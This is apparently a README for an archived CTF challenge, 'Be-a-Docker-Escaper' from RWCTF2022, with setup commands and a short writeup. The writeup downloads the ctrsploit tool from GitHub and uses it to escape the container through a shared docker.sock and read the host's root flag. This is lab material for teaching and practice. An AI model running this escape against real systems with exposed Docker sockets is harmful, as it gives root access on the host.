# RWCTF2022: Be-a-Docker-Escaper

Unofficial Copies from https://github.com/WinMin/Be-a-Docker-Escaper/tree/main/Be-a-Docker-Escaper

* dqd:
    * ssst0n3/docker_archive:be-a-docker-escaper -> ssst0n3/docker_archive:be-a-docker-escaper_v0.1.0
    * ssst0n3/docker_archive:be-a-docker-escaper_v0.1.0
* ctr:
    * ssst0n3/docker_archive:ctr_be-a-docker-escaper -> ssst0n3/docker_archive:ctr_be-a-docker-escaper_v0.1.0
    * ssst0n3/docker_archive:ctr_be-a-docker-escaper_v0.1.0

## usage

### Recommend

```shell
$ cd ctf/Be-a-Docker-Escaper
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

### Without kvm

KVM can speed up the environment, but it can also be started without KVM.

```shell
$ cd ctf/Be-a-Docker-Escaper
$ docker compose -f docker-compose.yml up -d
```

## writeup

```
$ sshpass -p ctf ssh -o StrictHostKeyChecking=no -p 25115 ctf@127.0.0.1
/ # wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul shared-socket docker.sock c
[Y]  docker.sock	# escape by shared docker socket

/ # ctrsploit vul shared-socket docker.sock x
# cat /root/flag
cat /root/flag
rwctf{THIS_IS_A_TEST_FLAG}
```

## challenge description

Do you want to be a docker escaper? So you need to be patient. It takes minutes for me to get a docker ready for you. I can’t make it faster without kvm, but I think you can do it locally. from: SpaceSkyNet

## build

```shell
make all DIR=ctf/Be-a-Docker-Escaper
```

for developers:

```dockerfile
FROM ssst0n3/docker_archive:ctr_be-a-docker-escaper_v0.1.0
```
